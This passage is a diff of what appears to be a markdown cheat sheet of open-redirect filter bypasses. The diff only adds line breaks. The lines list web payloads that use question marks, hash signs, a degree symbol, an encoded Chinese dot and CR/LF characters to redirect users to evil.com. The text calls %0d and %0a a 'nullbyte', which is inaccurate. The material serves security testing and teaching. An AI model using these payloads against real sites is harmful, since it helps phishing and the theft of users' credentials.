@@ -23,9 +23,9 @@ Bypass the filter if it only checks for domain name using a query/question mark 
 Example: ?redirect=example.com --> ?redirect=evil.com?example.com<br>
 Bypass the filter if it only checks for domain name using a hash %23<br>
 Example: ?redirect=example.com --> ?redirect=evil.com%23example.com<br>
-Bypass the filter using a ° symbol
-Example: ?redirect=example.com --> ?redirect=example.com/°evil.com
-Bypass the filter using a url encoded Chinese dot %E3%80%82
-Example: ?redirect=example.com --> ?redirect=evil.com%E3%80%82%23example.com
-Bypass the filter if it only allows you to control the path using a nullbyte %0d or %0a
-Example: ?redirect=/ --> ?redirect=/%0d/evil.com
+Bypass the filter using a ° symbol<br>
+Example: ?redirect=example.com --> ?redirect=example.com/°evil.com<br>
+Bypass the filter using a url encoded Chinese dot %E3%80%82<br>
+Example: ?redirect=example.com --> ?redirect=evil.com%E3%80%82%23example.com<br>
+Bypass the filter if it only allows you to control the path using a nullbyte %0d or %0a<br>
+Example: ?redirect=/ --> ?redirect=/%0d/evil.com<br>
